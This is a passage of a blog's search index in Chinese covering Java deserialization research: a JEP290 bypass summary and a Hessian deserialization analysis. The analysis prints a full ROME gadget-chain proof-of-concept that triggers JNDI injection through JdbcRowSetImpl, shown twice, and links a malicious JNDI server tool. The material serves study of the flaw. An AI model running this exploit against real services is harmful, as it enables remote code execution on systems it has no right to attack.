RemoteObject\u7684readObject\u65b9\u6cd5\u4f1a\u5728RMI\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\u88ab\u8c03\u7528\uff0c\u5176readObject\u65b9\u6cd5\u4f1a\u5728\u540e\u7eed\u4e2d\u8fd8\u539f\u6240\u5c01\u88c5\u7684LiveRef\u5bf9\u8c61\uff0c\u5e76\u5411LiveRef\u5bf9\u8c61\u6307\u5411\u7684\u6ce8\u518c\u7aef\u53d1\u8d77\u901a\u8baf\uff0c\u53cd\u5e8f\u5217\u5316\u5176\u8fd4\u56de\u7684\u6570\u636e\uff0c\u7531\u4e8e\u8be5\u53cd\u5e8f\u5217\u5316\u6d41\u672a\u589e\u6dfb\u8fc7\u6ee4\u5668\uff0c\u6240\u4ee5\u7ed5\u8fc7JEP290\u9020\u6210\u4e86\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u3002 \u56e0\u4e3a\u6587\u7ae0\u662f\u5728\u8fb9\u8c03\u8bd5\u8fb9\u5199\u7684\uff0c\u4e2d\u9014\u8fdb\u884c\u4e86\u591a\u6b21\u5220\u6539\uff0c\u6240\u4ee5\u5bfc\u81f4\u4e9b\u8bb8\u5730\u65b9\u8a00\u8f9e\u4e0d\u591f\u51c6\u786e\uff0c\u671b\u5404\u4f4d\u89c1\u8c05\u3002","title":"\u603b\u7ed3"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/","text":"Gadget\u5229\u7528\u7c7b\u603b\u7ed3 \u76ee\u5f55 URLClassloader JNDI \u4e3a\u4ec0\u4e48\u8981\u5199\u8fd9\u4e2a\u5462\uff1f\u56e0\u4e3a\u6211\u89c9\u5f97\u6211\u867d\u7136\u8c03\u8fc7\u5f88\u591agadget\uff0c\u4f46\u662f\u8fd8\u6ca1\u6709\u6210\u4f53\u7cfb\uff0c\u6240\u4ee5\u8bb0\u5f55\u4e00\u4e0bGadget\u4e2d\u91cd\u8981\u7684\u5404\u4e2a\u7c7b URLClassloader java.net.URLClassLoader \u53ef\u4ee5\u8fdc\u7a0b\u52a0\u8f7d\u8d44\u6e90,\u9002\u5408\u51fa\u7f51\u73af\u5883\u4f7f\u7528\u3002 JNDI","title":"Gadget\u5229\u7528\u7c7b\u603b\u7ed3"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/#gadget","text":"","title":"Gadget\u5229\u7528\u7c7b\u603b\u7ed3"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/#_1","text":"URLClassloader JNDI \u4e3a\u4ec0\u4e48\u8981\u5199\u8fd9\u4e2a\u5462\uff1f\u56e0\u4e3a\u6211\u89c9\u5f97\u6211\u867d\u7136\u8c03\u8fc7\u5f88\u591agadget\uff0c\u4f46\u662f\u8fd8\u6ca1\u6709\u6210\u4f53\u7cfb\uff0c\u6240\u4ee5\u8bb0\u5f55\u4e00\u4e0bGadget\u4e2d\u91cd\u8981\u7684\u5404\u4e2a\u7c7b","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/#urlclassloader","text":"java.net.URLClassLoader \u53ef\u4ee5\u8fdc\u7a0b\u52a0\u8f7d\u8d44\u6e90,\u9002\u5408\u51fa\u7f51\u73af\u5883\u4f7f\u7528\u3002","title":"URLClassloader"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/#jndi","text":"","title":"JNDI"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/#_2","text":"","title":""},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Hessian/Hessian/","text":"Hessian Hessian\u53cd\u5e8f\u5217\u5316","title":"Hessian"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Hessian/Hessian/#hessian","text":"Hessian\u53cd\u5e8f\u5217\u5316","title":"Hessian"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Hessian/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","text":"Hessian\u53cd\u5e8f\u5217\u5316 \u76ee\u5f55 \u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u673a\u5236 \u57fa\u4e8eBean \u57fa\u4e8efield Hessian\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316Demo Gadget\u2014\u2014ROME \u6b65\u9aa41 \u6b65\u9aa42 \u6b65\u9aa43 Hessian\u53cd\u5e8f\u5217\u5316\u548cjdk\u539f\u751f\u7684\u53cd\u5e8f\u5217\u5316\u4e0d\u540c\uff0c\u5176\u884d\u751f\u7684Gadget\u4e5f\u4e0d\u540c\u3002 \u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u673a\u5236 java\u4e2d\u7684\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u5927\u4f53\u4e0a\u5206\u4e3a\u4e24\u7c7b \u57fa\u4e8eBean \u5e38\u89c1\u7684\u653b\u51fb\u5bf9\u8c61\u6709 fastjson jackson Java XMLDecoder .... \u5176\u6838\u5fc3\u662f\u5728\u53cd\u5e8f\u5217\u5316\u5bf9\u8c61\u65f6\uff0c\u5176\u8c03\u7528getter\u3001setter\u65b9\u6cd5\uff08\u5982fastjson\uff09\uff0c\u6216\u8005\u9ed8\u8ba4\u6784\u9020\u65b9\u6cd5\uff0c\u6216\u8005\u7c7b\u5bf9\u8c61\u91cc\u7684\u5176\u4ed6\u65b9\u6cd5\u3002 \u8fd9\u79cd\u673a\u5236\u653b\u51fb\u9762\u6bd4\u57fa\u4e8efield\u66f4\u5927\u3002 \u57fa\u4e8efield \u5e38\u89c1\u7684\u653b\u51fb\u5bf9\u8c61 java\u539f\u751f\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316 Hessian ... \u57fa\u4e8eField\u7684\u65b9\u5f0f\uff0c\u4e00\u822c\u771f\u6b63\u8fdb\u884c\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u7684\u6838\u5fc3\u65b9\u6cd5\u662f\u4e00\u4e2anative\u65b9\u6cd5\uff0c\u76f4\u63a5\u5bf9Field\u8fdb\u884c\u8d4b\u503c\u64cd\u4f5c\u3002 Hessian\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316Demo maven\u4f9d\u8d56 <dependency> <groupId>com.caucho</groupId> <artifactId>hessian</artifactId> <version>4.0.38</version> </dependency> Hessian \u6bd4 \u539f\u751fJDK\u76f8\u6bd4\uff0c\u5e8f\u5217\u5316\u901f\u5ea6\u66f4\u6162\uff0c\u4f46\u53cd\u5e8f\u5217\u5316\u6240\u9700\u65f6\u95f4\u548c\u7a7a\u95f4\u90fd\u66f4\u5c0f Apple.java import java.io.Serializable; public class Apple implements Serializable { public void color(){ System.out.println(\"yellow\"); } public void size(){ System.out.println(\"10g\"); } } se.java import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import com.caucho.hessian.io.HessianInput; import com.caucho.hessian.io.HessianOutput; public class se { public static void main(String args[]) throws Exception{ Apple ap = new Apple(); ByteArrayOutputStream a = new ByteArrayOutputStream(); HessianOutput hi = new HessianOutput(a); hi.writeObject(ap); byte[] data= a.toByteArray(); ByteArrayInputStream b = new ByteArrayInputStream(data); HessianInput ho = new HessianInput(b); Apple apple =(Apple) ho.readObject(); apple.size(); } } Gadget\u2014\u2014ROME \u5728\u5de5\u5177 marshalsec\u4e2d\u652f\u6301\u5982\u4e0bHessian Gadget\uff0c\u5206\u6790\u4e00\u4e0bROME\u94fe\u5427 Rome XBean Resin SpringPartiallyComparableAdvisorHolder SpringAbstractBeanFactoryPointcutAdvisor \u9700\u8981\u4ee5\u4e0b\u4f9d\u8d56 <dependency> <groupId>com.rometools</groupId> <artifactId>rome</artifactId> <version>1.7.0</version> </dependency> poc\u5982\u4e0b\u3002\u6211\u4eec\u8ddf\u7740POC\u5206\u6790 import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.lang.reflect.Array; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.HashMap; import com.caucho.hessian.io.HessianInput; import com.caucho.hessian.io.HessianOutput; import com.rometools.rome.feed.impl.EqualsBean; import com.rometools.rome.feed.impl.ToStringBean; import com.sun.rowset.JdbcRowSetImpl; public class se { public static void main(String args[]) throws Exception{ //\u53cd\u5e8f\u5217\u5316\u65f6ToStringBean.toString()\u4f1a\u88ab\u8c03\u7528\uff0c\u89e6\u53d1JdbcRowSetImpl.getDatabaseMetaData->JdbcRowSetImpl.connect->Context.lookup String jndiUrl = \"ldap://localhost:10099/Sim\"; JdbcRowSetImpl rs = new JdbcRowSetImpl(); rs.setDataSourceName(jndiUrl); rs.setMatchColumn(\"foo\"); //\u53cd\u5e8f\u5217\u5316\u65f6EqualsBean.beanHashCode\u4f1a\u88ab\u8c03\u7528\uff0c\u89e6\u53d1ToStringBean.toString ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs); //\u53cd\u5e8f\u5217\u5316\u65f6HashMap.hash\u4f1a\u88ab\u8c03\u7528\uff0c\u89e6\u53d1EqualsBean.hashCode->EqualsBean.beanHashCode EqualsBean root = new EqualsBean(ToStringBean.class, item); //HashMap.put->HashMap.putVal->HashMap.hash HashMap<Object, Object> s = new HashMap<>(); setFieldValue(s, \"size\", 2); Class<?> nodeC; try { nodeC = Class.forName(\"java.util.HashMap$Node\"); } catch ( ClassNotFoundException e ) { nodeC = Class.forName(\"java.util.HashMap$Entry\"); } Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC); nodeCons.setAccessible(true); Object tbl = Array.newInstance(nodeC, 1); Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null)); setFieldValue(s, \"table\", tbl); ByteArrayOutputStream a= new ByteArrayOutputStream(); HessianOutput ho = new HessianOutput(a); ho.writeObject(s); byte[] data= a.toByteArray(); ByteArrayInputStream b = new ByteArrayInputStream(data); HessianInput hi = new HessianInput(b); hi.readObject(); //\u89e6\u53d1\u70b9 } public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField ( final Class<?> clazz, final String fieldName ) throws Exception { try { Field field = clazz.getDeclaredField(fieldName); if ( field != null ) field.setAccessible(true); else if ( clazz.getSuperclass() != null ) field = getField(clazz.getSuperclass(), fieldName); return field; } catch ( NoSuchFieldException e ) { if ( !clazz.getSuperclass().equals(Object.class) ) { return getField(clazz.getSuperclass(), fieldName); } throw e; } } } \u6211\u4eec\u5728 hi.readObject()\u6253\u4e0b\u65ad\u70b9\u8ddf\u8fdb\u770b\u770b\u539f\u7406\u3002 \u56e0\u4e3a\u8fd9\u4e2agadget\u6700\u7ec8\u662f\u63a7\u5236lookup\u53c2\u6570\u5b8c\u6210jndi\u6ce8\u5165\uff0c\u6240\u4ee5\u5bf9jdk\u7248\u672c\u4e5f\u6709\u6240\u9650\u5236\uff0c\u8fd9\u91cc\u9009\u62e9\u7684\u7248\u672c\u662f 8u181\u914d\u5408ldap\u534f\u8bae\u5b8c\u6210jndi\u6ce8\u5165 \u5e76\u4f7f\u7528\u6b64\u9879\u76ee\u4e00\u952e\u542f\u52a8jndi\u6076\u610f\u670d\u52a1\u7aef https://github.com/F4ded/EZ-JNDI \u4ecepoc\u6765\u770b\uff0c\u8fc7\u7a0b\u65e0\u975e\u5c313\u6b65\uff1a HashMap.put->HashMap.putVal->HashMap.hash\u2192EqualsBean.hashCode->EqualsBean.beanHashCode EqualsBean.beanHashCode\u88ab\u8c03\u7528\uff0c\u89e6\u53d1ToStringBean.toString ToStringBean.toString()\u88ab\u8c03\u7528\uff0c\u89e6\u53d1JdbcRowSetImpl.getDatabaseMetaData->JdbcRowSetImpl.connect->Context.lookup \u6b65\u9aa41 \u6700\u5f00\u59cb\u7684\u6b65\u9aa4\uff0c\u5c31\u662f\u4ecereadObject\u5230HashMap.hash \u6211\u4eec\u8ddf\u8fdbreadObject\u65b9\u6cd5\uff0c\u53d1\u73b0\u5b83\u4f1a\u6839\u636e\u5e8f\u5217\u5316\u5bf9\u8c61\u7684\u7c7b\u578b\u6765\u9009\u62e9\u4e0d\u540c\u7684\u5904\u7406\u65b9\u6cd5 \u7531\u4e8eHessian\u5e8f\u5217\u5316\u65f6\u5c06\u7ed3\u679c\u5904\u7406\u6210\u4e86Map\uff0c\u6240\u4ee5\u5904\u7406\u7684\u7b2c\u4e00\u4e2a\u5e8f\u5217\u5316\u5bf9\u8c61\u603b\u662fmap\u5bf9\u8c61\uff0c\u8fd9\u662fHessian\u53cd\u5e8f\u5217\u5316\u4e00\u4e2a\u7279\u6b8a\u7684\u673a\u5236\u3002 \u5f53\u5904\u7406\u5230\u6211\u4eec\u81ea\u5df1\u5b9a\u4e49\u7684HashMap\u65f6\uff08\u4e5f\u5c31\u662fpoc\u4e2d\u7684s\uff09\uff0c\u5b83\u4f1a\u6309\u5148\u540e\u987a\u5e8f\u53cd\u5e8f\u5217\u5316key\u3001value\u503c\uff0c\u7136\u540e\u4f9d\u6b21\u4f20\u5165Hashmap.put\u65b9\u6cd5\u8fdb\u884c\u5904\u7406 \u7136\u540e\u7ecf\u7531Hashmap.putVal\u5904\u7406 \u968f\u540e\u8c03\u7528key\u7684hashcode\u65b9\u6cd5\uff0c\u7531\u4e8ekey\u662fEqualsBean\uff0c\u6240\u4ee5\u4f1a\u8c03\u7528EqualsBean.hashCode()\uff0c\u8ddf\u8fdb\u540e\u4f1a\u53d1\u73b0\u8c03\u7528EqualsBean.beanHashCode() \u53d1\u73b0\u4f1a\u8c03\u7528this.obj.toString() \u6b65\u9aa42 \u7531\u4e8e\u6211\u4eec\u5728poc\u5411EqualsBean\u6784\u9020\u65b9\u6cd5\u4f20\u5165\u4e86ToStringBean\u5bf9\u8c61item\uff0c\u6240\u4ee5this.obj\u5c31\u662f\u4e00\u4e2aToStringBean\u5bf9\u8c61 \u6240\u4ee5this.obj.toString() \u5373ToStringBean.toString \u8ddf\u8fdb\u540e\u53ef\u4ee5\u53d1\u73b0\u5b83\u4f1a\u904d\u5386\u6211\u4eec\u5728ToStringBean\u91cc\u4f20\u5165\u7684\u7c7b\uff08poc\u91cc\u4f20\u5165\u7684\u662fJdbcRowSetImpl\uff09\u7684\u6240\u6709\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u7136\u540e\u65e0\u901a\u8fc7\u53cd\u5c04\u53c2\u8c03\u7528\u6240\u6709\u65b9\u6cd5\u3002 \u5176\u4e2d\u5c31\u4f1a\u8c03\u7528\u5230JdbcRowSetImpl\u7684\u65e0\u53c2\u65b9\u6cd5\uff1agetDatabaseMetaData \u6b65\u9aa43 \u6211\u4eec\u8ddf\u8fdbgetDatabaseMetaData \u53d1\u73b0\u4f1a\u8c03\u7528connect\u65b9\u6cd5\uff0c\u7ee7\u7eed\u8ddf\u8fdb\uff0c\u53d1\u73b0jndi\u6ce8\u5165\uff0clookup\u53c2\u6570\u662f\u53ef\u63a7\u7684\uff1a\u6211\u4eec\u5728poc\u4e2d\u6784\u5efaJdbcRowSetImpl\u5bf9\u8c61\u65f6\u901a\u8fc7setDataSourceName\u65b9\u6cd5\u8bbe\u7f6e \u7ee7\u7eed\u8ddf\uff0c\u5f39\u8ba1\u7b97\u5668\u4e86","title":"Hessian\u53cd\u5e8f\u5217\u5316"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Hessian/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#hessian","text":"","title":"Hessian\u53cd\u5e8f\u5217\u5316"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Hessian/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_1","text":"\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u673a\u5236 \u57fa\u4e8eBean \u57fa\u4e8efield Hessian\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316Demo Gadget\u2014\u2014ROME \u6b65\u9aa41 \u6b65\u9aa42 \u6b65\u9aa43 Hessian\u53cd\u5e8f\u5217\u5316\u548cjdk\u539f\u751f\u7684\u53cd\u5e8f\u5217\u5316\u4e0d\u540c\uff0c\u5176\u884d\u751f\u7684Gadget\u4e5f\u4e0d\u540c\u3002","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Hessian/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_2","text":"java\u4e2d\u7684\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u5927\u4f53\u4e0a\u5206\u4e3a\u4e24\u7c7b","title":"\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u673a\u5236"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Hessian/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#bean","text":"\u5e38\u89c1\u7684\u653b\u51fb\u5bf9\u8c61\u6709 fastjson jackson Java XMLDecoder .... \u5176\u6838\u5fc3\u662f\u5728\u53cd\u5e8f\u5217\u5316\u5bf9\u8c61\u65f6\uff0c\u5176\u8c03\u7528getter\u3001setter\u65b9\u6cd5\uff08\u5982fastjson\uff09\uff0c\u6216\u8005\u9ed8\u8ba4\u6784\u9020\u65b9\u6cd5\uff0c\u6216\u8005\u7c7b\u5bf9\u8c61\u91cc\u7684\u5176\u4ed6\u65b9\u6cd5\u3002 \u8fd9\u79cd\u673a\u5236\u653b\u51fb\u9762\u6bd4\u57fa\u4e8efield\u66f4\u5927\u3002","title":"\u57fa\u4e8eBean"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Hessian/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#field","text":"\u5e38\u89c1\u7684\u653b\u51fb\u5bf9\u8c61 java\u539f\u751f\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316 Hessian ... \u57fa\u4e8eField\u7684\u65b9\u5f0f\uff0c\u4e00\u822c\u771f\u6b63\u8fdb\u884c\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u7684\u6838\u5fc3\u65b9\u6cd5\u662f\u4e00\u4e2anative\u65b9\u6cd5\uff0c\u76f4\u63a5\u5bf9Field\u8fdb\u884c\u8d4b\u503c\u64cd\u4f5c\u3002","title":"\u57fa\u4e8efield"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Hessian/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#hessiandemo","text":"maven\u4f9d\u8d56 <dependency> <groupId>com.caucho</groupId> <artifactId>hessian</artifactId> <version>4.0.38</version> </dependency> Hessian \u6bd4 \u539f\u751fJDK\u76f8\u6bd4\uff0c\u5e8f\u5217\u5316\u901f\u5ea6\u66f4\u6162\uff0c\u4f46\u53cd\u5e8f\u5217\u5316\u6240\u9700\u65f6\u95f4\u548c\u7a7a\u95f4\u90fd\u66f4\u5c0f Apple.java import java.io.Serializable; public class Apple implements Serializable { public void color(){ System.out.println(\"yellow\"); } public void size(){ System.out.println(\"10g\"); } } se.java import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import com.caucho.hessian.io.HessianInput; import com.caucho.hessian.io.HessianOutput; public class se { public static void main(String args[]) throws Exception{ Apple ap = new Apple(); ByteArrayOutputStream a = new ByteArrayOutputStream(); HessianOutput hi = new HessianOutput(a); hi.writeObject(ap); byte[] data= a.toByteArray(); ByteArrayInputStream b = new ByteArrayInputStream(data); HessianInput ho = new HessianInput(b); Apple apple =(Apple) ho.readObject(); apple.size(); } }","title":"Hessian\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316Demo"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Hessian/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#gadgetrome","text":"\u5728\u5de5\u5177 marshalsec\u4e2d\u652f\u6301\u5982\u4e0bHessian Gadget\uff0c\u5206\u6790\u4e00\u4e0bROME\u94fe\u5427 Rome XBean Resin SpringPartiallyComparableAdvisorHolder SpringAbstractBeanFactoryPointcutAdvisor \u9700\u8981\u4ee5\u4e0b\u4f9d\u8d56 <dependency> <groupId>com.rometools</groupId> <artifactId>rome</artifactId> <version>1.7.0</version> </dependency> poc\u5982\u4e0b\u3002\u6211\u4eec\u8ddf\u7740POC\u5206\u6790 import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.lang.reflect.Array; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.HashMap; import com.caucho.hessian.io.HessianInput; import com.caucho.hessian.io.HessianOutput; import com.rometools.rome.feed.impl.EqualsBean; import com.rometools.rome.feed.impl.ToStringBean; import com.sun.rowset.JdbcRowSetImpl; public class se { public static void main(String args[]) throws Exception{ //\u53cd\u5e8f\u5217\u5316\u65f6ToStringBean.toString()\u4f1a\u88ab\u8c03\u7528\uff0c\u89e6\u53d1JdbcRowSetImpl.getDatabaseMetaData->JdbcRowSetImpl.connect->Context.lookup String jndiUrl = \"ldap://localhost:10099/Sim\"; JdbcRowSetImpl rs = new JdbcRowSetImpl(); rs.setDataSourceName(jndiUrl); rs.setMatchColumn(\"foo\"); //\u53cd\u5e8f\u5217\u5316\u65f6EqualsBean.beanHashCode\u4f1a\u88ab\u8c03\u7528\uff0c\u89e6\u53d1ToStringBean.toString ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs); //\u53cd\u5e8f\u5217\u5316\u65f6HashMap.hash\u4f1a\u88ab\u8c03\u7528\uff0c\u89e6\u53d1EqualsBean.hashCode->EqualsBean.beanHashCode EqualsBean root = new EqualsBean(ToStringBean.class, item); //HashMap.put->HashMap.putVal->HashMap.hash HashMap<Object, Object> s = new HashMap<>(); setFieldValue(s, \"size\", 2); Class<?> nodeC; try { nodeC = Class.forName(\"java.util.HashMap$Node\"); } catch ( ClassNotFoundException e ) { nodeC = Class.forName(\"java.util.HashMap$Entry\"); } Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC); nodeCons.setAccessible(true); Object tbl = Array.newInstance(nodeC, 1); Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null)); setFieldValue(s, \"table\", tbl); ByteArrayOutputStream a= new ByteArrayOutputStream(); HessianOutput ho = new HessianOutput(a); ho.writeObject(s); byte[] data= a.toByteArray(); ByteArrayInputStream b = new ByteArrayInputStream(data); HessianInput hi = new HessianInput(b); hi.readObject(); //\u89e6\u53d1\u70b9 } public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField ( final Class<?> clazz, final String fieldName ) throws Exception { try { Field field = clazz.getDeclaredField(fieldName); if ( field != null ) field.setAccessible(true); else if ( clazz.getSuperclass() != null ) field = getField(clazz.getSuperclass(), fieldName); return field; } catch ( NoSuchFieldException e ) { if ( !clazz.getSuperclass().equals(Object.class) ) { return getField(clazz.getSuperclass(), fieldName); } throw e; } } } \u6211\u4eec\u5728 hi.readObject()\u6253\u4e0b\u65ad\u70b9\u8ddf\u8fdb\u770b\u770b\u539f\u7406\u3002 \u56e0\u4e3a\u8fd9\u4e2agadget\u6700\u7ec8\u662f\u63a7\u5236lookup\u53c2\u6570\u5b8c\u6210jndi\u6ce8\u5165\uff0c\u6240\u4ee5\u5bf9jdk\u7248\u672c\u4e5f\u6709\u6240\u9650\u5236\uff0c\u8fd9\u91cc\u9009\u62e9\u7684\u7248\u672c\u662f 8u181\u914d\u5408ldap\u534f\u8bae\u5b8c\u6210jndi\u6ce8\u5165 \u5e76\u4f7f\u7528\u6b64\u9879\u76ee\u4e00\u952e\u542f\u52a8jndi\u6076\u610f\u670d\u52a1\u7aef https://github.com/F4ded/EZ-JNDI \u4ecepoc\u6765\u770b\uff0c\u8fc7\u7a0b\u65e0\u975e\u5c313\u6b65\uff1a HashMap.put->HashMap.putVal->HashMap.hash\u2192EqualsBean.hashCode->EqualsBean.beanHashCode EqualsBean.beanHashCode\u88ab\u8c03\u7528\uff0c\u89e6\u53d1ToStringBean.toString ToStringBean.toString()\u88ab\u8c03\u7528\uff0c\u89e6\u53d1JdbcRowSetImpl.getDatabaseMetaData->JdbcRowSetImpl.connect->Context.lookup","title":"Gadget\u2014\u2014ROME"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Hessian/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#1","text":"\u6700\u5f00\u59cb\u7684\u6b65\u9aa4\uff0c\u5c31\u662f\u4ecereadObject\u5230HashMap.hash \u6211\u4eec\u8ddf\u8fdbreadObject\u65b9\u6cd5\uff0c\u53d1\u73b0\u5b83\u4f1a\u6839\u636e\u5e8f\u5217\u5316\u5bf9\u8c61\u7684\u7c7b\u578b\u6765\u9009\u62e9\u4e0d\u540c\u7684\u5904\u7406\u65b9\u6cd5 \u7531\u4e8eHessian\u5e8f\u5217\u5316\u65f6\u5c06\u7ed3\u679c\u5904\u7406\u6210\u4e86Map\uff0c\u6240\u4ee5\u5904\u7406\u7684\u7b2c\u4e00\u4e2a\u5e8f\u5217\u5316\u5bf9\u8c61\u603b\u662fmap\u5bf9\u8c61\uff0c\u8fd9\u662fHessian\u53cd\u5e8f\u5217\u5316\u4e00\u4e2a\u7279\u6b8a\u7684\u673a\u5236\u3002 \u5f53\u5904\u7406\u5230\u6211\u4eec\u81ea\u5df1\u5b9a\u4e49\u7684HashMap\u65f6\uff08\u4e5f\u5c31\u662fpoc\u4e2d\u7684s\uff09\uff0c\u5b83\u4f1a\u6309\u5148\u540e\u987a\u5e8f\u53cd\u5e8f\u5217\u5316key\u3001value\u503c\uff0c\u7136\u540e\u4f9d\u6b21\u4f20\u5165Hashmap.put\u65b9\u6cd5\u8fdb\u884c\u5904\u7406 \u7136\u540e\u7ecf\u7531Hashmap.putVal\u5904\u7406 \u968f\u540e\u8c03\u7528key\u7684hashcode\u65b9\u6cd5\uff0c\u7531\u4e8ekey\u662fEqualsBean\uff0c\u6240\u4ee5\u4f1a\u8c03\u7528EqualsBean.hashCode()\uff0c\u8ddf\u8fdb\u540e\u4f1a\u53d1\u73b0\u8c03\u7528EqualsBean.beanHashCode() 